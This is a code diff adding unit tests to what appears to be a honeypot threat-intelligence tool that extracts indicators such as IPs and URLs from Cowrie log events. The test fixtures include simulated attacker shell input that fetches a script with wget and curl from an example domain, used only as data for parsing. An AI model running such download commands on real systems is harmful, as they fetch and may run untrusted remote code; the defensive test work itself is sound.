@@ -3,6 +3,7 @@ from datetime import datetime, timezone
 
 from backend.api import event_identity, safe, timestamp
 from backend.routes import extract_iocs
+from backend.intelligence import observables
 
 
 class CoreTests(unittest.TestCase):
@@ -26,6 +27,18 @@ class CoreTests(unittest.TestCase):
 
     def test_ioc_rejects_invalid_ip(self):
         self.assertFalse(any(x["tipo"] == "IP" for x in extract_iocs("ping 999.999.999.999", 7)))
+
+    def test_cowrie_observables_keep_origin_and_exclude_filenames(self):
+        result = observables({"eventid": "cowrie.command.input", "src_ip": "192.0.2.7",
+                              "input": "wget https://example.org/tool.sh; ls collector.py virus.txt"})
+        self.assertIn(("IP", "192.0.2.7", "IP de origen registrada por Cowrie"), result)
+        self.assertTrue(any(kind == "URL" and value == "https://example.org/tool.sh"
+                            for kind, value, _ in result))
+        self.assertFalse(any(kind == "Dominio" for kind, _, _ in result))
+
+    def test_observables_do_not_imply_command_execution(self):
+        result = observables({"eventid": "cowrie.command.input", "input": "curl http://example.org/a"})
+        self.assertTrue(any("descarga no confirmada" in evidence for _, _, evidence in result))
 
 
 if __name__ == "__main__":
